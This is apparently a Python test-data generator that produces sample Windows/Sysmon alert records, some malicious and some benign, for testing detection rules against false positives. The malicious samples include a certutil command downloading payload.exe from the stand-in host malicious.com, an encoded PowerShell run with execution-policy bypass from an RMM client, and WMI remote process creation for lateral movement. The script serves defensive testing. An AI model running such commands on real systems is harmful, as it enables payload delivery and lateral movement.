#!/usr/bin/env python3
"""Generate comprehensive test dataset based on your RMM simulation"""



def generate_malicious_logs():
    """Generate malicious test logs based on various attack techniques"""

    base_scenarios = {
        "rmm_encoded_powershell": {
            "rule": {"id": 61603, "level": 12, "description": "Sysmon - Process Creation"},
            "win": {
                "eventdata": {
                    "commandLine": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand {}",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\ProgramData\\RMMClient\\rmmclient.exe"
                }
            }
        },

        "certutil_download": {
            "rule": {"id": 18152, "level": 10, "description": "Windows - Process Creation"},
            "win": {
                "eventdata": {
                    "commandLine": "certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\\temp\\payload.exe",
                    "image": "C:\\Windows\\System32\\certutil.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe"
                }
            }
        },

        "wmi_lateral_movement": {
            "rule": {"id": 61604, "level": 8, "description": "Sysmon - Process Creation"},
            "win": {
                "eventdata": {
                    "commandLine": "wmic /node:192.168.1.50 process call create \"powershell.exe -enc ZAB...\"",
                    "image": "C:\\Windows\\System32\\wbem\\wmic.exe",
                    "parentImage": "C:\\Windows\\System32\\cmd.exe"
                }
            }
        }
    }

    # Generate variants with different domains, IPs, file paths
    return base_scenarios


def generate_benign_logs():
    """Generate benign test logs for false positive testing"""

    benign_scenarios = {
        "legitimate_powershell": {
            "rule": {"id": 61603, "level": 3, "description": "Sysmon - Process Creation"},
            "win": {
                "eventdata": {
                    "commandLine": "powershell.exe Get-Process | Where-Object {$_.CPU -gt 100}",
                    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "parentImage": "C:\\Windows\\explorer.exe"
                }
            }
        },

        "windows_update": {
            "rule": {"id": 18145, "level": 3, "description": "Windows - Service Installation"},
            "win": {
                "eventdata": {
                    "serviceName": "Windows Update Service",
                    "imagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
                    "accountName": "LocalSystem"
                }
            }
        }
    }

    return benign_scenarios


if __name__ == "__main__":
    # Create test data
    print("🗂️  Generating comprehensive test dataset...")

    print("✅ Use your existing RMM simulation logs as the foundation")
    print("📋 Create additional scenarios based on MITRE ATT&CK framework")
